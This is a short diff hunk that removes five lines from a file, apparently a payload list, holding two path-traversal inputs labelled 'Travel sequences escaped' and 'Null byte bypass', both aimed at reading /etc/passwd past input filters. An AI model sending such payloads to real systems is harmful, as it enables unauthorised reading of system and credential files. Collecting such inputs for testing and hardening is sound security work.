@@ -1,5 +1,0 @@
-Travel sequences escaped
-....//....//....//etc/passwd
-
-Null byte bypass
-../../../etc/passwd%00.png
